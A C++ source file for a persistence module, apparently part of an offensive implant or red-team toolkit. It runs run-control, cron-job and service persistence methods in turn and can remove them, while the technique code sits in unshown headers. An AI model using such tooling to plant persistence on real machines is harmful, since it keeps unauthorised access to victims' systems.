#include "modules/Persistence.hpp"
#include "utils/Logger.hpp"

#ifdef METHOD_RUNCONTROL
    #include "modules/persistence/RunControl.hpp"
#endif
#ifdef METHOD_CRON
    #include "modules/persistence/CronJob.hpp"
#endif
#ifdef METHOD_SERVICE
    #include "modules/persistence/Service.hpp"
#endif

Persistence::Persistence() {
    #ifdef METHOD_RUNCONTROL
    methods.push_back(std::make_unique<RunControlMethod>());
    #endif
    #ifdef METHOD_CRON
    methods.push_back(std::make_unique<CronJobMethod>());
    #endif
    #ifdef METHOD_SERVICE
    methods.push_back(std::make_unique<ServiceMethod>());
    #endif
}

bool Persistence::execute(const std::string& args) {
    bool anySuccess = false;
    LOG_INFO("Trying persistence with {} methods available", methods.size())

    for (auto& method : methods) {
        LOG_INFO("Trying method: {}", method->getName())

        if (method->install()) {
            LOG_SUCCESS("Persistence established via {}", method->getName())
            anySuccess = true;
        } else {
            LOG_ERROR("Persistence failed via {}", method->getName())
        }
    }

    if (!anySuccess) {
        LOG_ERROR("All persistence methods failed")
    }

    return anySuccess;
}

void Persistence::restore() {
    for (auto& method : methods) {
        method->remove();
    }
}
